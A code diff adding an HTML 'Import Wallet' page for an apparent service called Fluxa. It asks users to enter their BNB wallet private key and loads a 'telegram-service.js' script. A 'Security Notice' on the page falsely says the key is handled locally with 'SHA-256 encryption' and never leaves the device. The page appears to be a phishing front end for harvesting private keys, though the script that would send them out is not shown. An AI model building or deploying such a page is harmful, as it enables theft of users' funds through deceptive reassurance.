@@ -1,0 +1,86 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import Wallet - Fluxa</title>
+    <link href="wallet-style.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+    <div class="container">
+        <div class="wallet-card">
+            <!-- Header -->
+            <div class="header">
+                <button class="back-btn" onclick="goBack()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5"/>
+                        <path d="M12 19l-7-7 7-7"/>
+                    </svg>
+                </button>
+                <h1>Import Wallet</h1>
+                <div></div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="import-content">
+                <!-- Wallet Icon -->
+                <div class="wallet-icon-section">
+                    <div class="icon-circle-gold">
+                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/>
+                            <path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/>
+                            <path d="M18 12a2 2 0 0 0 0 4h4v-4z"/>
+                        </svg>
+                    </div>
+                    <h3>Import Wallet</h3>
+                    <p class="subtitle">Enter your private key to import your BNB wallet</p>
+                </div>
+
+                <!-- Import Form -->
+                <div class="import-form-card">
+                    <div class="form-section">
+                        <label for="privateKey" class="input-label">Private Key</label>
+                        <div class="input-wrapper">
+                            <input 
+                                type="password" 
+                                id="privateKey" 
+                                class="private-key-input" 
+                                placeholder="Enter your private key (64 characters)"
+                            >
+                        </div>
+                        
+                        <button class="btn-gold" onclick="importWallet()">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="11" cy="11" r="8"/>
+                                <path d="M21 21l-4.35-4.35"/>
+                            </svg>
+                            Import Wallet
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Security Notice -->
+                <div class="security-notice-card">
+                    <div class="notice-content">
+                        <div class="notice-icon">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"/>
+                                <line x1="12" y1="16" x2="12" y2="12"/>
+                                <line x1="12" y1="8" x2="12.01" y2="8"/>
+                            </svg>
+                        </div>
+                        <div>
+                            <h4>Security Notice</h4>
+                            <p>Your private key is processed locally using SHA-256 encryption and never sent to our servers. Your wallet address will be derived automatically.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="telegram-service.js"></script>
+    <script src="import-script.js"></script>
+</body>
+</html>
